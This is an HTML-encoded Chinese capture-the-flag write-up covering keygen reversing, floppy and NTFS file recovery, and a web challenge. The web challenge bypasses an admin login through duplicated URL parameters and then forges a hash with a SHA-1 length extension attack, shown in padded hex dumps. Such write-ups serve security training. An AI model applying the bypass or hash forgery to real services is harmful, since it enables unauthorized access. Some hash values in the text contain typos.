<p>&#x540E;&#x9762;&#x7528;&amp;&amp;&#x9694;&#x5F00;&#x7684;&#x4E00;&#x5171;&#x6709;47&#x4E2A;&#x65B9;&#x7A0B;&#xFF0C;&#x7406;&#x8BBA;&#x4E0A;47&#x4E2A;&#x65B9;&#x7A0B;47&#x4E2A;&#x672A;&#x77E5;&#x91CF;&#x662F;&#x53EF;&#x89E3;&#x7684;&#xFF0C;&#x4ED4;&#x7EC6;&#x89C2;&#x5BDF;&#x4E00;&#x4E0B;&#xFF0C;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x5C06;&#x65B9;&#x7A0B;&#x6309;&#x7167;&#x957F;&#x5EA6;&#x6392;&#x5E8F;&#x7684;&#x8BDD;&#xFF0C;&#x4ECE;&#x4E0A;&#x81F3;&#x4E0B;&#x6BCF;&#x9694;&#x4E00;&#x884C;&#x5373;&#x53EF;&#x89E3;&#x51FA;&#x6765;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x4ED6;&#x7684;&#x65B9;&#x7A0B;&#x6BCF;&#x591A;&#x4E00;&#x884C;&#x5C31;&#x53EA;&#x591A;&#x4E86;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x800C;&#x5DF2;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;eval&#x5BF9;&#x65B0;&#x591A;&#x51FA;&#x6765;&#x7684;&#x53D8;&#x91CF;&#x8FDB;&#x884C;&#x7206;&#x7834;&#x4E86;&#xFF0C;&#x811A;&#x672C;&#xFF1A;</p>
<p><img src="http://img0.tuicool.com/NraYf2R.jpg" alt=""></p>
<h4 id="Keygen">Keygen</h4><p>&#x7A0B;&#x5E8F;&#x6709;&#x5F88;&#x591A;&#x79CD;&#x89E3;&#xFF0C;&#x901A;&#x8FC7;&#x5411;&#x670D;&#x52A1;&#x5668;&#x63D0;&#x4EA4;&#x4E00;&#x79CD;&#x89E3;&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;flag&#xFF1A;</p>
<p><img src="http://img1.tuicool.com/ANnYFb.jpg" alt=""></p>
<p><img src="http://img2.tuicool.com/2ueuYn.jpg" alt=""></p>
<p>&#x6700;&#x4F18;&#x5148;&#x786E;&#x5B9A;&#x7684;&#x662F;4,9,14,19&#x4F4D;&#x7F6E;&#xFF0C;&#x7136;&#x540E;&#xFF0C;&#x5C06;&#x4E4B;&#x524D;&#x7684;&#x7A0B;&#x5E8F;&#x4E34;&#x6479;&#xFF0C;&#x901A;&#x8FC7;&#x5BF9;&#x90E8;&#x5206;&#x4F4D;&#x7F6E;&#x7684;&#x56FA;&#x5B9A;&#x8D4B;&#x503C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BA1;&#x7B97;&#x51FA;&#x53E6;&#x5916;&#x4F4D;&#x7F6E;&#x7684;&#x5408;&#x9002;&#x7684;&#x6570;&#x503C;&#x3002;</p>
<pre><code><span class="label">__author__</span> = &amp;apos<span class="comment">;bibi&amp;apos;</span>
<span class="label">import</span> hashlib
<span class="label">a1</span>=&amp;quot<span class="comment">;0&amp;quot;*24</span>
<span class="label">def</span> run(<span class="literal">a1</span>):
    <span class="preprocessor">if</span> len(<span class="literal">a1</span>)!<span class="number">=24</span>:
        return <span class="number">0</span>
    v16= [
        <span class="literal">a1</span>[<span class="number">11</span>],
        <span class="literal">a1</span>[<span class="number">2</span>],
        <span class="literal">a1</span>[<span class="number">1</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">13</span>],
        <span class="literal">a1</span>[<span class="number">16</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">10</span>],
        <span class="literal">a1</span>[<span class="number">7</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">17</span>],
    ]
    <span class="literal">v8</span> = [
        <span class="literal">a1</span>[<span class="number">15</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">12</span>],
        <span class="literal">a1</span>[<span class="number">18</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">0</span>],
        <span class="literal">a1</span>[<span class="number">6</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">8</span>],
        <span class="literal">a1</span>[<span class="number">5</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">3</span>],
    ]
    v16 += <span class="literal">v8</span>
    f = open(&amp;apos<span class="comment">;./sn_download&amp;apos;, &amp;apos;rb&amp;apos;)</span>
    d = f.read()[<span class="number">0x18e0</span>:]
    f.close()
    v24=[]
    <span class="label">#print</span> v16
    for j in range(<span class="number">16</span>):
        <span class="preprocessor">if</span> (ord(d[j]) - <span class="number">48</span> &amp;gt<span class="comment">; 9) | (ord(d[j]) &amp;lt; 48):</span>
            k = ord(d[j])
            v24.append(v16[k])
<span class="label">        else:</span>
            v24.append(d[j])
    <span class="label">#print</span> v24
    <span class="label">#print</span> &amp;apos<span class="comment">;&amp;apos;.join(c for c in v24)</span>
    temp=&amp;quot<span class="comment">;&amp;quot;.join(v24)</span>
    v25<span class="label">=hashlib</span>.md5(temp).digest()
    <span class="label">#print</span> v25
    <span class="label">#print</span> v25.encode(&amp;apos<span class="comment">;hex&amp;apos;)</span>
    v26=[]
    f = open(&amp;apos<span class="comment">;./sn_download&amp;apos;, &amp;apos;rb&amp;apos;)</span>
    <span class="literal">d2</span> = f.read()[<span class="number">0x18f0</span>:]
    f.close()
    for k in range(<span class="number">16</span>):
        v26.append(<span class="literal">d2</span>[ord(v25[k]) &amp;gt<span class="comment">;&amp;gt; 4])</span>
        v26.append(<span class="literal">d2</span>[ord(v25[k]) &amp;amp<span class="comment">; 0xf])</span>
    <span class="label">#print</span> v26
    v42 = &amp;apos<span class="comment">;&amp;apos;</span>
    for i in range(<span class="number">16</span>):
        v42 <span class="label">=v42</span> + <span class="keyword">str(ord(v26[i]))
</span>    temp = v42.split(&amp;apos<span class="comment">;0&amp;apos;)</span>
    final_v42 = &amp;apos<span class="comment">;&amp;apos;</span>
    for t in temp:
        final_v42 += t
    &amp;apos<span class="comment">;&amp;apos;&amp;apos;</span>
    for m in range(<span class="number">5</span>,<span class="number">13</span>):
        <span class="preprocessor">if</span> final_v42[m] != <span class="literal">v8</span>[m-<span class="number">5</span>]:
            result<span class="number">=0</span>
            return <span class="number">0</span>
    &amp;apos<span class="comment">;&amp;apos;&amp;apos;</span>
    <span class="literal">v8</span> = final_v42[<span class="number">5</span>:<span class="number">13</span>]
    <span class="literal">a2</span> = <span class="literal">a1</span>[<span class="number">0</span>:<span class="number">15</span>]+<span class="literal">v8</span>[<span class="number">0</span>]+<span class="literal">a1</span>[<span class="number">16</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">12</span>]+<span class="literal">v8</span>[<span class="number">1</span>]+<span class="literal">a2</span>[<span class="number">13</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">18</span>]+<span class="literal">v8</span>[<span class="number">2</span>]+<span class="literal">a2</span>[<span class="number">19</span>:]
    <span class="literal">a2</span> = <span class="literal">v8</span>[<span class="number">3</span>]+<span class="literal">a2</span>[<span class="number">1</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">6</span>]+<span class="literal">v8</span>[<span class="number">4</span>]+<span class="literal">a2</span>[<span class="number">7</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">8</span>]+<span class="literal">v8</span>[<span class="number">5</span>]+<span class="literal">a2</span>[<span class="number">9</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">5</span>]+<span class="literal">v8</span>[<span class="number">6</span>]+<span class="literal">a2</span>[<span class="number">6</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">3</span>]+<span class="literal">v8</span>[<span class="number">7</span>]+<span class="literal">a2</span>[<span class="number">4</span>:]
    return <span class="literal">a2</span>
<span class="label">a1</span> = &amp;apos<span class="comment">;aaaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;abaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;acaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;adaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;aeaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;afaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;agaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;ahaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;aiaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;ajaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
</code></pre><h4 id="Broken">Broken</h4><p>&#x4EC0;&#x4E48;&#x90FD;&#x662F;&#x574F;&#x7684;&#xFF0C;&#x627E;&#x4E86;&#x4E2A;&#x6B63;&#x5E38;&#x7684;&#x5F15;&#x5BFC;&#x533A;&#x76F4;&#x63A5;winhex&#x8986;&#x76D6;&#x5934;&#xFF0C;&#x53D1;&#x73B0;&#x542F;&#x52A8;&#x4E0D;&#x4E86;&#xFF0C;&#x901A;&#x8FC7;vmware&#x5728;windows&#x4E0B;&#x6302;&#x8F7D;&#x8F6F;&#x76D8;&#x955C;&#x50CF;&#x6216;&#x8005;&#x76F4;&#x63A5;winhex&#x6253;&#x5F00;&#xFF0C;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x51E0;&#x4E2A;&#x6587;&#x4EF6;&#xFF1A;</p>
<p><img src="http://img0.tuicool.com/J3mumaF.jpg" alt=""></p>
<p><img src="http://img2.tuicool.com/eMnIjq.jpg" alt=""></p>
<p>Flag&#x6587;&#x4EF6;&#x62FF;&#x4E0B;&#x6765;&#xFF0C;&#x8865;&#x4E0A;png&#x7684;&#x6587;&#x4EF6;&#x5934;&#xFF1A;</p>
<p><img src="http://img1.tuicool.com/Q3iaAjy.jpg" alt=""></p>
<p><img src="http://img0.tuicool.com/2EVBvmJ.jpg" alt=""></p>
<p>&#x5F00;&#x8111;&#x6D1E;&#xFF0C;&#x8C03;&#x5927;&#x957F;&#x5EA6;&#xFF0C;&#x62FF;&#x5230;flag&#xFF1A;</p>
<p><img src="http://img1.tuicool.com/3eyAJvn.jpg" alt=""></p>
<h4 id="NESTING_DOLL">NESTING DOLL</h4><p><a href="https://github.com/SilasX/QuineRelayFiles&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#xFF0C;&#x88C5;&amp;#x3002" target="_blank" rel="external">https://github.com/SilasX/QuineRelayFiles&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#xFF0C;&#x88C5;&amp;#x3002</a>;</p>
<h4 id="Repartition:">Repartition:</h4><p>&#x6839;&#x636E;&#x9898;&#x76EE;&#x63D0;&#x793A;</p>
<p><img src="http://img0.tuicool.com/Efy26n.jpg" alt=""></p>
<p>Secret.rar&#x88AB;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x7528;&#x666E;&#x901A;&#x7684;&#x6570;&#x636E;&#x6062;&#x590D;&#x8F6F;&#x4EF6;&#x5373;&#x53EF;&#x8FD8;&#x539F;&#x3002;</p>
<p>&#x4F46;&#x662F;secretpass.txt&#x88AB;&#x5927;&#x6587;&#x4EF6;&#x8986;&#x76D6;&#x4E86;</p>
<p>&#x627E;&#x5230;&#x5176;ntfs&#x7236;&#x76EE;&#x5F55;&#x6587;&#x4EF6;&#x8BB0;&#x5F55;0x80b1800&#xFF0C;&#x5728;&#x4E0B;&#x65B9;&#x504F;&#x79FB;0&#xD7;200&#x51FA;&#x53D1;&#x73B0;secret.rar&#x7684;&#x5BC6;&#x7801;</p>
<p><img src="http://img2.tuicool.com/I7ry6zE.jpg" alt=""></p>
<p>&#x89E3;&#x538B;&#x5F97;&#x5230;flag{ch0n9x1n_f3n9u-fu_g41_yebu4nquan}</p>
<h4 id="Salt">Salt</h4><p>&#x672C;&#x9898;&#x5173;&#x952E;&#x70B9;&#x6709;&#x4E24;&#x4E2A;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x7528;&#x6237;&#x540D;admin&#x7684;&#x7ED5;&#x8FC7;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x662F;sha1&#x7684;&#x957F;&#x5EA6;&#x6269;&#x5C55;&#x653B;&#x51FB;&#x3002;</p>
<p>&#x7B2C;&#x4E00;&#x70B9;&#x7ED5;&#x8FC7;&#x7684;&#x5173;&#x952E;&#x70B9;&#x662F;url&#x89E3;&#x6790;&#x7684;&#x65F6;&#x5019;&#x540E;&#x9762;&#x7684;&#x53D8;&#x91CF;&#x4F1A;&#x8986;&#x76D6;&#x524D;&#x9762;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x6784;&#x9020;</p>
<pre><code>/login?<span class="variable">username=</span>a&amp;amp;<span class="variable">password=</span>aaaaaa&amp;amp;<span class="variable">username=</span>admin
</code></pre><p>&#x5373;&#x53EF;&#xFF0C;&#x6CE8;&#x610F;&#x6B64;&#x5904;&#x7684;password&#x5FC5;&#x987B;&#x4E3A;6-20&#x4F4D;&#xFF0C;&#x8FD9;&#x91CC;&#x53D6;6&#x4F4D;&#x3002;</p>
<p>&#x5BF9;&#x4E8E;&#x7B2C;&#x4E8C;&#x70B9;&#x7684;&#x7ED5;&#x8FC7;&#xFF0C;&#x8FD9;&#x91CC;&#x89E3;&#x91CA;&#x4E00;&#x4E0B;&#x957F;&#x5EA6;&#x6269;&#x5C55;&#x653B;&#x51FB;&#xFF0C;&#x5728;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x9700;&#x8981;&#x54C8;&#x5E0C;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x4E3A;</p>
<pre><code><span class="number">00000000</span>: <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span> <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span>   <span class="number">74</span>  <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span> <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span>  saltsaltsaltsalt
<span class="number">00000010</span>: <span class="number">2</span>F <span class="number">6</span><span class="keyword">C</span> <span class="number">6</span>F <span class="number">67</span> <span class="number">69</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">3</span>F <span class="number">75</span>  <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">D</span> <span class="number">65</span> <span class="number">3</span><span class="keyword">D</span>  /login?username=
<span class="number">00000020</span>: <span class="number">61</span> <span class="number">26</span> <span class="number">70</span> <span class="number">61</span> <span class="number">73</span> <span class="number">73</span> <span class="number">77</span>   <span class="number">6</span>F  <span class="number">72</span> <span class="number">64</span> <span class="number">3</span><span class="keyword">D</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  a&amp;amp;password=aaaaa
<span class="number">00000030</span>: <span class="number">61</span> <span class="number">26</span> <span class="number">75</span> <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">61</span>  <span class="number">6</span><span class="keyword">D</span> <span class="number">65</span> <span class="number">3</span><span class="keyword">D</span> <span class="number">61</span> <span class="number">64</span> <span class="number">6</span><span class="keyword">D</span> <span class="number">69</span> <span class="number">6</span><span class="keyword">E</span>  a&amp;amp;username=admin
</code></pre><p>&#x5728;sha1&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x5148;&#x8865;&#x4E00;&#x4E2A;&#x6BD4;&#x7279;&#x7684;1&#xFF0C;&#x4E5F;&#x5C31;&#x662F;0&#xD7;80&#xFF0C;&#x7136;&#x540E;&#x8865;&#x9F50;&#x81F3;&#x4F59;512&#x4E3A;418&#xFF0C;&#x4E5F;&#x5C31;&#x662F;52&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x5269;&#x4F59;&#x7684;12&#x4E2A;&#x5B57;&#x8282;&#x7528;&#x6765;&#x8865;&#x9F50;&#x957F;&#x5EA6;&#xFF0C;&#x5373;*&#xFF08;&#x6CE8;&#xFF1A;&#x8865;&#x9F50;&#xFF0C;&#x4F59;512&#x4E3A;448&#xFF0C;&#x6700;&#x540E;&#x516B;&#x5B57;&#x8282;&#x8865;&#x9F50;&#x957F;&#x5EA6;&#xFF09;</p>
<pre><code><span class="number">00000000</span>: 73 61 6C <span class="number">74 73 61 6</span>C   74  73 61 6C <span class="number">74 73 61 6</span>C 74  saltsaltsaltsalt
<span class="number">00000010</span>: 2F 6C 6F 67 69 6E 3F   75  <span class="number">73 65 72 6</span>E 61 6D 65 3D  /login?username=
<span class="number">00000020</span>: <span class="number">61 26 70 61</span> 73 73 77   6F  72 64 3D <span class="number">61 61 61 61</span> 61  a&amp;amp<span class="comment">;password=aaaaa</span>
<span class="number">00000030</span>: <span class="number">61 26 75 73</span> 65 72 6E   61  6D 65 3D 61 64 6D 69 6E  a&amp;amp<span class="comment">;username=admin</span>
<span class="number">00000040</span>: <span class="number">80 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000050</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000060</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000070</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 02 00</span>  ................
</code></pre><p>&#x7136;&#x540E;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x4F5C;&#x4E3A;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x8FDB;&#x884C;&#x8BA1;&#x7B97;&#xFF0C;</p>
<pre><code><span class="setting">h0=<span class="value"><span class="number">0</span>x67452301,</span></span>
<span class="setting">h1=<span class="value"><span class="number">0</span>xEFCDAB89,</span></span>
<span class="setting">h2=<span class="value"><span class="number">0</span>x98BADCFE,</span></span>
<span class="setting">h3=<span class="value"><span class="number">0</span>x10325476,</span></span>
<span class="setting">h4=<span class="value"><span class="number">0</span>xC3D2E1F0</span></span>
</code></pre><p>&#x8BA1;&#x7B97;&#x7684;&#x89C4;&#x5219;&#x662F;&#x5BF9;&#x8865;&#x9F50;&#x540E;&#x7684;&#x6570;&#x636E;&#x4EE5;512bit&#x5373;64&#x5B57;&#x8282;&#x4E3A;&#x4E00;&#x7EC4;&#x8FDB;&#x884C;&#x79FB;&#x4F4D;&#x5F02;&#x6216;&#x7B49;&#x6570;&#x5B66;&#x8BA1;&#x7B97;&#xFF0C;&#x6BCF;&#x4E00;&#x7EC4;&#x8BA1;&#x7B97;&#x4F1A;&#x6539;&#x53D8;h1-h4&#x7684;&#x503C;&#xFF0C;&#x8FD9;&#x4E9B;&#x6539;&#x53D8;&#x7684;&#x503C;&#x5C06;&#x4F5C;&#x4E3A;&#x4E0B;&#x4E00;&#x7EC4;&#x8BA1;&#x7B97;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x3002;&#x5168;&#x90E8;&#x7EC4;&#x8BA1;&#x7B97;&#x5B8C;&#x6210;&#x540E;&#x6700;&#x7EC8;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x62FC;&#x63A5;&#x8D77;&#x6765;&#x5C31;&#x662F;sha1&#x7684;&#x503C;&#x3002;</p>
<p>&#x8FD9;&#x6837;&#x5C31;&#x5F62;&#x6210;&#x4E86;&#x6211;&#x4EEC;&#x7684;&#x653B;&#x51FB;&#x601D;&#x8DEF;&#xFF0C;&#x9996;&#x5148;&#x53D1;&#x9001;&#x6B63;&#x5E38;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x83B7;&#x53D6;sha1&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x624B;&#x52A8;&#x8865;&#x9F50;&#x4E0A;&#x4E00;&#x7EC4;&#x6B63;&#x5E38;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x53C8;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;sha1&#xFF0C;&#x4E4B;&#x540E;&#x5BF9;&#x7B2C;&#x4E00;&#x7EC4;&#x83B7;&#x53D6;&#x7684;sha1&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x8FDB;&#x884C;&#x63D0;&#x53D6;&#xFF0C;&#x4FEE;&#x6539;&#x7B97;&#x6CD5;&#x4E2D;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x8FD9;&#x4E2A;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x7B97;&#x6CD5;&#x4EC5;&#x4EC5;&#x7528;&#x4E8E;&#x5BF9;&#x7B2C;&#x4E8C;&#x7EC4;&#x6570;&#x636E;&#x7684;&#x8865;&#x5168;&#x6570;&#x636E;&#x8FDB;&#x884C;sha1&#xFF0C;&#x5C31;&#x80FD;&#x5F97;&#x51FA;&#x4E0E;&#x7B2C;&#x4E8C;&#x7EC4;&#x83B7;&#x53D6;&#x7684;sha1&#x76F8;&#x540C;&#x7684;&#x6570;&#x636E;&#x3002;</p>
<p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x7684;&#x7B2C;&#x4E00;&#x7EC4;&#x6570;&#x636E;&#x4E3A;</p>
<pre><code><span class="number">00000000</span>: <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span> <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span>   <span class="number">74</span>  <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span> <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span>  saltsaltsaltsalt
<span class="number">00000010</span>: <span class="number">2</span>F <span class="number">6</span><span class="keyword">C</span> <span class="number">6</span>F <span class="number">67</span> <span class="number">69</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">3</span>F   <span class="number">75</span>  <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">D</span> <span class="number">65</span> <span class="number">3</span><span class="keyword">D</span>  /login?username=
<span class="number">00000020</span>: <span class="number">61</span> <span class="number">26</span> <span class="number">70</span> <span class="number">61</span> <span class="number">73</span> <span class="number">73</span> <span class="number">77</span>   <span class="number">6</span>F  <span class="number">72</span> <span class="number">64</span> <span class="number">3</span><span class="keyword">D</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  a&amp;amp;password=aaaaa
<span class="number">00000030</span>: <span class="number">61</span> <span class="number">26</span> <span class="number">75</span> <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">6</span><span class="keyword">E</span>   <span class="number">61</span>  <span class="number">6</span><span class="keyword">D</span> <span class="number">65</span> <span class="number">3</span><span class="keyword">D</span> <span class="number">61</span> <span class="number">64</span> <span class="number">6</span><span class="keyword">D</span> <span class="number">69</span> <span class="number">6</span><span class="keyword">E</span>  a&amp;amp;username=admin
</code></pre><p>&#x8FD9;&#x7EC4;&#x6570;&#x636E;&#x83B7;&#x53D6;&#x7684;sha1&#x4E3A;a02d54c05cecc94ff2d698146e0b2c778104d85&#xFF0C;&#x83B7;&#x53D6;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x5206;&#x522B;&#x4E3A;0xa02d54c0&#xFF0C;0x5cecc94f&#xFF0C;0xf2d69814&#xFF0C;0x6e0b2c77&#xFF0C;0x8104d85</p>
<p>&#x53D1;&#x9001;&#x7684;&#x7B2C;&#x4E8C;&#x7EC4;&#x6570;&#x636E;&#x4E3A;</p>
<pre><code><span class="number">00000000</span>: 73 61 6C <span class="number">74 73 61 6</span>C   74  73 61 6C <span class="number">74 73 61 6</span>C 74  saltsaltsaltsalt
<span class="number">00000010</span>: 2F 6C 6F 67 69 6E 3F   75  <span class="number">73 65 72 6</span>E 61 6D 65 3D  /login?username=
<span class="number">00000020</span>: <span class="number">61 26 70 61</span> 73 73 77   6F  72 64 3D <span class="number">61 61 61 61</span> 61  a&amp;amp<span class="comment">;password=aaaaa</span>
<span class="number">00000030</span>: <span class="number">61 26 75 73</span> 65 72 6E   61  6D 65 3D 61 64 6D 69 6E  a&amp;amp<span class="comment">;username=admin</span>
<span class="number">00000040</span>: <span class="number">80 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000050</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000060</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000070</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 02 00</span>  ................
</code></pre><p>&#x8BE5;&#x7EC4;&#x5728;&#x8BA1;&#x7B97;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x8865;&#x5168;&#x7684;&#x7ED3;&#x679C;&#x4E3A;</p>
<pre><code><span class="number">00000000</span>: 73 61 6C <span class="number">74 73 61 6</span>C   74  73 61 6C <span class="number">74 73 61 6</span>C 74  saltsaltsaltsalt
<span class="number">00000010</span>: 2F 6C 6F 67 69 6E 3F   75  <span class="number">73 65 72 6</span>E 61 6D 65 3D  /login?username=
<span class="number">00000020</span>: <span class="number">61 26 70 61</span> 73 73 77   6F  72 64 3D <span class="number">61 61 61 61</span> 61  a&amp;amp<span class="comment">;password=aaaaa</span>
<span class="number">00000030</span>: <span class="number">61 26 75 73</span> 65 72 6E   61  6D 65 3D 61 64 6D 69 6E  a&amp;amp<span class="comment">;username=admin</span>
<span class="number">00000040</span>: <span class="number">80 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000050</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000060</span>: <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000070</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 02 00</span>  ................
<span class="number">00000080</span>: <span class="number">80 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000090</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">000000A0</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">000000B0</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 04 00</span>  ................
</code></pre><p>&#x83B7;&#x53D6;&#x7684;sha1&#x4E3A;f687bedf0ce1e96f9238c7dae716337b0d9d74ad</p>
<p>&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x5C06;&#x521D;&#x59CB;&#x5316;&#x53D8;&#x91CF;0xa02d54c0,0x5cecc94f0x,f2d69814,0x6e0b2c77,0x8104d85&#x5E26;&#x5165;&#x7B97;&#x6CD5;&#xFF0C;&#x53EA;&#x9700;&#x8BA1;&#x7B97;&#x8865;&#x4E0A;&#x7684;&#x4FE1;&#x606F;</p>
